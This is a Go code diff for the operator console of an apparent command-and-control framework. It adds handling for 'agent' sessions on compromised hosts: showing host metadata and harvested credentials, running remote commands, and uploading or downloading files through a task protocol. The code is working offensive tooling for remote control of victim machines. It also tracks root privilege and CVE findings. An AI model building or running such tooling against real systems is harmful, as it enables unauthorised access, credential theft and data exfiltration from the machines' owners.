@@ -211,7 +211,12 @@ func (c *Console) displaySessions(sessions []*Session) {
 		var user, osStr, cveStr string
 		suffix := ""
 
-		if s.Findings == nil {
+		if s.IsAgent && s.AgentMeta != nil {
+			user = s.AgentMeta.User
+			osStr = s.AgentMeta.OS + "/" + s.AgentMeta.Arch
+			cveStr = "-"
+			suffix = ansiGreen + "  [agent]" + ansiReset
+		} else if s.Findings == nil {
 			user = "..."
 			osStr = "..."
 			cveStr = "..."
@@ -405,6 +410,12 @@ func (c *Console) cmdUse(args []string) {
 		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
+	if sess.IsAgent {
+		sess.mu.Unlock()
+		fmt.Printf("[!] Session %d is an agent session — use 'exec %d <cmd>' to run commands.\n", id, id)
+		fmt.Printf("    Interactive PTY support for agents is planned for a future phase.\n")
+		return
+	}
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
 		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
@@ -482,7 +493,32 @@ func (c *Console) cmdInfo(args []string) {
 	creds := sess.HarvestedCreds
 	isRoot := sess.IsRoot
 	rootLevel := sess.RootLevel
+	agentMeta := sess.AgentMeta
+	isAgent := sess.IsAgent
 	sess.mu.Unlock()
+
+	// Agent sessions: display metadata from the Hello handshake.
+	if isAgent {
+		if agentMeta == nil {
+			fmt.Printf("[!] Session %d agent metadata not yet available.\n", id)
+			return
+		}
+		if isRoot {
+			fmt.Printf("\n  %s*** PRIVILEGED — uid=0 (%s) ***%s\n", ansiBoldRed, rootLevel, ansiReset)
+		}
+		fmt.Printf("\n[AGENT SESSION %d]\n", id)
+		fmt.Printf("  %-14s %s\n", "Version:", agentMeta.Version)
+		fmt.Printf("  %-14s %s\n", "Machine ID:", agentMeta.MachineID)
+		fmt.Printf("  %-14s %s\n", "Hostname:", safeFindings(agentMeta.Hostname))
+		fmt.Printf("  %-14s %s / %s\n", "Platform:", agentMeta.OS, agentMeta.Arch)
+		fmt.Printf("  %-14s %s (uid=%s)\n", "User:", safeFindings(agentMeta.User), agentMeta.UID)
+		if creds != nil && *creds != "" {
+			fmt.Println("\n[HARVESTED CREDENTIALS]")
+			fmt.Println(stripDangerousAnsi(*creds))
+		}
+		fmt.Println()
+		return
+	}
 
 	if findings == nil {
 		fmt.Printf("[!] No recon data for session %d — run 'recon %d' first.\n", id, id)
@@ -530,18 +566,42 @@ func (c *Console) cmdExec(args []string) {
 		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
+
+	// Build the command string (everything after the session ID).
+	var cmdParts []string
+	for i := 1; i < len(args); i++ {
+		cmdParts = append(cmdParts, args[i])
+	}
+	cmdStr := strings.Join(cmdParts, " ")
+
+	// Agent sessions: dispatch via structured task protocol.
+	if sess.IsAgent {
+		sess.mu.Unlock()
+		if cmdStr == "" {
+			fmt.Println("[!] Usage: exec <id> <command>")
+			return
+		}
+		res, err := agentExec(sess, cmdStr, 30*time.Second)
+		if err != nil {
+			fmt.Printf("[!] Exec failed: %v\n", err)
+			return
+		}
+		if res.Error != "" {
+			fmt.Printf("[!] Remote error: %s\n", res.Error)
+		}
+		if len(res.Output) > 0 {
+			fmt.Print(stripDangerousAnsi(string(res.Output)))
+			if !strings.HasSuffix(string(res.Output), "\n") {
+				fmt.Println()
+			}
+		}
+		return
+	}
+
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
 		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
 		return
-	}
-	// Extract the command (everything after the session ID)
-	var cmd strings.Builder
-	for i := 1; i < len(args); i++ {
-		if i > 1 {
-			cmd.WriteString(" ")
-		}
-		cmd.WriteString(args[i])
 	}
 	u := sess.Upgrader
 	drainWasRunning := sess.drainStop != nil
@@ -561,8 +621,7 @@ func (c *Console) cmdExec(args []string) {
 	}()
 
 	// Send command and read output
-	cmdStr := cmd.String() + "\n"
-	if err := u.write(cmdStr); err != nil {
+	if err := u.write(cmdStr + "\n"); err != nil {
 		fmt.Printf("[!] Failed to send command: %v\n", err)
 		return
 	}
@@ -578,7 +637,7 @@ func (c *Console) cmdExec(args []string) {
 	clean := u.StripPrompts(output)
 	// Remove the command we sent from the output (if present)
 	lines := strings.Split(clean, "\n")
-	if len(lines) > 0 && strings.TrimSpace(lines[0]) == strings.TrimSpace(cmd.String()) {
+	if len(lines) > 0 && strings.TrimSpace(lines[0]) == strings.TrimSpace(cmdStr) {
 		lines = lines[1:]
 	}
 	clean = strings.Join(lines, "\n")
@@ -933,6 +992,24 @@ func (c *Console) cmdDownload(args []string) {
 		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
+
+	// Agent sessions: use structured file transfer.
+	if sess.IsAgent {
+		sess.mu.Unlock()
+		fmt.Printf("[*] Downloading %s from session %d...\n", remotePath, id)
+		data, dlErr := agentDownload(sess, remotePath)
+		if dlErr != nil {
+			fmt.Printf("[!] Download failed: %v\n", dlErr)
+			return
+		}
+		if err := os.WriteFile(localPath, data, 0600); err != nil {
+			fmt.Printf("[!] Failed to save file: %v\n", err)
+			return
+		}
+		fmt.Printf("[+] Saved %d bytes to %s\n", len(data), localPath)
+		return
+	}
+
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
 		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
@@ -1117,6 +1194,19 @@ func (c *Console) cmdUpload(args []string) {
 		fmt.Printf("[!] Session %d has been terminated.\n", id)
 		return
 	}
+
+	// Agent sessions: use structured file transfer.
+	if sess.IsAgent {
+		sess.mu.Unlock()
+		fmt.Printf("[*] Uploading %s → %s on session %d...\n", localPath, remotePath, id)
+		if ulErr := agentUpload(sess, remotePath, data); ulErr != nil {
+			fmt.Printf("[!] Upload failed: %v\n", ulErr)
+			return
+		}
+		fmt.Printf("[+] Uploaded %d bytes to %s\n", len(data), remotePath)
+		return
+	}
+
 	if sess.Upgrader == nil {
 		sess.mu.Unlock()
 		fmt.Printf("[!] Session %d is still initializing — try again in a moment.\n", id)
